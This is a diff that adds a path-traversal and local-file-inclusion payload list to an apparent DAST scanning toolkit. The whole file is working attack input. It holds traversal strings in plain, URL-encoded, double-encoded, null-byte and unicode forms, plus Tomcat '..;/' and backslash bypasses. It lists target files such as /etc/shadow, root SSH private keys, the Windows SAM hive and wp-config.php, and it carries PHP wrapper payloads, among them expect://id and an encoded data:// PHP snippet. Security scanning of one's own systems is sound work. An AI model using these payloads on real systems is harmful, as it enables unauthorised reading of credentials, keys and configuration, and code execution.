@@ -1,0 +1,283 @@
+# =============================================================================
+# LFI / Path Traversal Payloads
+# justdastit DAST toolkit
+# =============================================================================
+# Categories: Basic traversal, encoding bypasses, null byte, unicode,
+#             ..;/ bypass, Windows targets, Linux targets
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# BASIC TRAVERSAL — Linux /etc/passwd
+# -----------------------------------------------------------------------------
+/etc/passwd
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+/./etc/passwd
+/../etc/passwd
+/../../etc/passwd
+
+# -----------------------------------------------------------------------------
+# BASIC TRAVERSAL — Dot-dot-slash with leading slash variations
+# -----------------------------------------------------------------------------
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+
+# -----------------------------------------------------------------------------
+# URL ENCODING VARIANTS
+# -----------------------------------------------------------------------------
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+..%255c..%255c..%255c..%255cetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%25252f..%25252f..%25252f..%25252fetc%25252fpasswd
+
+# Double URL encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
+
+# Triple URL encoding
+%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
+
+# -----------------------------------------------------------------------------
+# NULL BYTE INJECTION
+# -----------------------------------------------------------------------------
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.php
+../../../etc/passwd%00.txt
+../../../etc/passwd%00.pdf
+../../../../etc/passwd%00
+../../../../etc/passwd%00.html
+../../../../etc/passwd%00.php
+../../../../etc/passwd%00.png
+../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+
+# -----------------------------------------------------------------------------
+# UNICODE NORMALIZATION BYPASS
+# -----------------------------------------------------------------------------
+..%c0%ae..%c0%ae..%c0%ae..%c0%ae/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%af/etc/passwd
+..%c1%1c..%c1%1c..%c1%1c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%af/etc/passwd
+%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
+..%u2215..%u2215..%u2215..%u2215etc/passwd
+..%u2216..%u2216..%u2216..%u2216etc/passwd
+
+# -----------------------------------------------------------------------------
+# ..;/ BYPASS (Tomcat/Spring path normalization)
+# -----------------------------------------------------------------------------
+..;/etc/passwd
+..;/..;/etc/passwd
+..;/..;/..;/etc/passwd
+..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/..;/..;/etc/passwd
+..;\..;\..;\..;\etc\passwd
+..;\..\..;\..\etc\passwd
+
+# -----------------------------------------------------------------------------
+# BACKSLASH VARIANTS (IIS / Windows normalization)
+# -----------------------------------------------------------------------------
+..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\etc\passwd
+..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
+..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
+..%255c..%255c..%255c..%255cetc%255cpasswd
+..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
+
+# -----------------------------------------------------------------------------
+# LINUX SENSITIVE FILES
+# -----------------------------------------------------------------------------
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/motd
+/etc/group
+/etc/resolv.conf
+/etc/crontab
+/etc/ssh/sshd_config
+/etc/ssh/ssh_config
+/etc/ssh/ssh_host_rsa_key
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/httpd/conf/httpd.conf
+/etc/mysql/my.cnf
+/etc/my.cnf
+/etc/redis/redis.conf
+/etc/mongod.conf
+/etc/postgresql/pg_hba.conf
+/etc/environment
+/etc/security/limits.conf
+/etc/sysctl.conf
+/etc/fstab
+/etc/mtab
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/status
+/proc/self/maps
+/proc/self/cgroup
+/proc/self/mountinfo
+/proc/version
+/proc/net/tcp
+/proc/net/udp
+/proc/net/arp
+/proc/cpuinfo
+/proc/meminfo
+/proc/sched_debug
+/var/log/syslog
+/var/log/auth.log
+/var/log/messages
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/mail.log
+/var/log/secure
+/var/log/lastlog
+/var/log/wtmp
+/var/log/btmp
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/*/.bash_history
+/home/*/.ssh/id_rsa
+/home/*/.ssh/authorized_keys
+/opt/tomcat/conf/server.xml
+/opt/tomcat/conf/tomcat-users.xml
+/opt/tomcat/conf/web.xml
+/var/www/html/.htaccess
+/var/www/html/wp-config.php
+/var/www/html/configuration.php
+/usr/local/etc/php/php.ini
+/etc/php.ini
+
+# Traversal to Linux sensitive files
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../var/log/auth.log
+../../../../root/.bash_history
+../../../../root/.ssh/id_rsa
+
+# -----------------------------------------------------------------------------
+# WINDOWS SENSITIVE FILES
+# -----------------------------------------------------------------------------
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SECURITY
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\Windows\debug\NetSetup.log
+C:\Windows\Panther\unattend.xml
+C:\Windows\Panther\Unattend\unattend.xml
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\php\php.ini
+C:\xampp\mysql\bin\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Windows\php.ini
+C:\Windows\System32\inetsrv\config\applicationHost.config
+C:\Users\Administrator\Desktop\desktop.ini
+C:\Users\Administrator\NTUser.dat
+
+# Windows traversal variants
+..\..\..\..\Windows\win.ini
+..\..\..\..\boot.ini
+..\..\..\..\Windows\System32\drivers\etc\hosts
+..\..\..\..\inetpub\wwwroot\web.config
+..\..\..\..\Windows\Panther\unattend.xml
+..%5c..%5c..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5c..%5cboot.ini
+../../../../Windows/win.ini
+../../../../boot.ini
+../../../../inetpub/wwwroot/web.config
+../../../../Windows/System32/drivers/etc/hosts
+
+# -----------------------------------------------------------------------------
+# PHP WRAPPER / STREAM PAYLOADS
+# -----------------------------------------------------------------------------
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+php://input
+php://stdin
+php://memory
+php://temp
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+expect://id
+zip://shell.jpg%23payload.php
+phar://shell.jpg/payload.php
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///C:/Windows/win.ini
+
+# -----------------------------------------------------------------------------
+# ADDITIONAL BYPASS TECHNIQUES
+# -----------------------------------------------------------------------------
+# Double dot variations
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+....//....//....//etc/passwd
+....\\....\\....\\....\\etc\\passwd
+
+# Dot stripping bypass
+./../.../.././../../../etc/passwd
+.//.././../../../etc/passwd
+
+# Path truncation
+../../../etc/passwd...............................................................
+../../../etc/passwd/./././././././././././././././././././././././././././././.
+
+# Adding current directory references
+./../../../etc/passwd
+/var/www/../../etc/passwd
+/var/www/html/../../../etc/passwd
+
+# Extension append bypass
+../../../etc/passwd%00.php
+../../../etc/passwd%00.jpg
+../../../etc/passwd%0a
+../../../etc/passwd%0d
+../../../etc/passwd/.
+../../../etc/passwd/
+../../../etc/passwd#
